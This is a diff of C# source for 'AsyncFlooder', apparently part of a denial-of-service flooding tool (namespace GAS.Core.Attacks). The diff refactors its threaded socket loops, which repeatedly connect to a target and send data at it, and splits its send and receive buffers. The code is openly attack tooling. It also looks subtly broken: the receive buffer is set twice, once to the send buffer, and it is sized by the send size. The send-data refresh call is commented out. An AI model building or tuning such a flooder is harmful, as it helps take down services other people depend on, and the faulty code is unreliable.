@@ -1,5 +1,5 @@
 ﻿using System;
-using System.Diagnostics;
+using System.Linq;
 using System.Net.Sockets;
 using System.Threading;
 using GAS.Core.AttackInformation;
@@ -57,6 +57,7 @@ namespace GAS.Core.Attacks {
             get { return this._isAttacking; }
         }
 
+        //parallel
         private Socket[] _workingSocket;
         private Thread[] _workingThreads;
         private SocketAsyncEventArgs[] _connectArgs;
@@ -65,7 +66,8 @@ namespace GAS.Core.Attacks {
         private EventHandler<SocketAsyncEventArgs> _fSend;
         private EventHandler<SocketAsyncEventArgs> _fConn;
         private EventHandler<SocketAsyncEventArgs> _fRecv;
-        private byte[][] _buffers;
+        private byte[][] _sendBuffers;
+        private byte[][] _recvBuffers;
         private ulong[] _sendLast;
         private ulong[] _recvLast;
 
@@ -73,7 +75,7 @@ namespace GAS.Core.Attacks {
             return new SocketAsyncEventArgs {
                 DisconnectReuseSocket = true,
                 SocketFlags = SocketFlags.None,
-                SendPacketsSendSize = 65000
+                SendPacketsSendSize = 16384                                                                              
             };
         }
         private void UpdateArgs( int i, AttackInfo info ) {
@@ -85,7 +87,8 @@ namespace GAS.Core.Attacks {
         public AsyncFlooder( AttackInfo info, int threadCount = 1 ) {
             this.Info = info;
             this.ThreadCount = threadCount;
-            this._buffers = new byte[ this.ThreadCount ][];
+            this._sendBuffers = new byte[ this.ThreadCount ][];
+            this._recvBuffers = new byte[ this.ThreadCount ][];
             this._connectArgs = new SocketAsyncEventArgs[ this.ThreadCount ];
             this._fConn = ( a, b ) => this.LoopExec( (Socket) a, b, this.ConnectedWorker, this.SentWorker, this.ReceivedWorker );
             this._fSend = ( a, b ) => this.LoopExec( (Socket) a, b, this.SentWorker, this.ReceivedWorker );
@@ -100,7 +103,9 @@ namespace GAS.Core.Attacks {
             this._workingSocket = new Socket[ this.ThreadCount ];
             this._workingThreads = new Thread[ this.ThreadCount ];
             for ( var i = 0; i < this.ThreadCount; i++ )
-                this._buffers[ i ] = new byte[ info.bufferSize ];
+                this._sendBuffers[ i ] = new byte[ info.SendBufferSize ];
+            for ( var i = 0; i < this.ThreadCount; i++ )
+                this._recvBuffers[ i ] = new byte[ info.ReadBufferSize ];
         }
 
         public void Start() {
@@ -133,9 +138,11 @@ namespace GAS.Core.Attacks {
                 this._connectArgs[ i ].Completed += this._fConn;
                 this._connectArgs[ i ].UserToken = i;
                 this._recvArgs[ i ].Completed += this._fRecv;
+                this._recvArgs[ i ].SetBuffer( this._sendBuffers[i], 0, this.Info.SendBufferSize );
                 this._recvArgs[ i ].UserToken = i;
                 this._sendArgs[ i ].Completed += this._fSend;
                 this._sendArgs[ i ].UserToken = i;
+                this._recvArgs[ i ].SetBuffer( this._recvBuffers[ i ], 0, this.Info.SendBufferSize );
 
                 //dirty hack
                 if (this._workingSocket[i].SocketType!=SocketType.Stream){
@@ -171,7 +178,7 @@ namespace GAS.Core.Attacks {
                 && this._sendLast[ index ]-- > 0
                 && ( b.SocketError == SocketError.Success && s.Connected ) )
                 try {
-                    this.RefreshSendData( index );
+                    //this.RefreshSendData( index );
                     if ( s.SendAsync( this._sendArgs[ index ] ) ) return true;
                 }
                 catch { }
@@ -204,15 +211,14 @@ namespace GAS.Core.Attacks {
 
         private void LoopExec( Socket s, SocketAsyncEventArgs b, params Func<Socket, SocketAsyncEventArgs, bool>[] runs ) {
             var index = (int) b.UserToken;
-            bool isStream = s.SocketType == SocketType.Stream;
+            var isStream = s.SocketType == SocketType.Stream;
             while ( this._isAttacking )
                 try {
                     if ( isStream && !s.Connected ) {
                         if ( this.SocketConnect( index ) ) return;
                         s = this._workingSocket[ index ];
                     }
-                    foreach (var run in runs)
-                        if ( run( s, b ) ) return;
+                    if ( runs.Any( run => run( s, b ) ) ) return;
                 }
                 catch { }
         }
@@ -234,8 +240,10 @@ namespace GAS.Core.Attacks {
         }
         
         private void RefreshSendData( int i ) {
-            var b = this._buffers[ i ];
-            this._sendArgs[ i ].SetBuffer( b, 0, Info.Randomizer( b, i ) );
+            var a = this._sendArgs[ i ];
+            var b = a.Buffer;
+            var cnt = Info.Randomizer( b, i );
+            a.SetBuffer(0,cnt);
         }
 
         private Socket CreateSocket() {
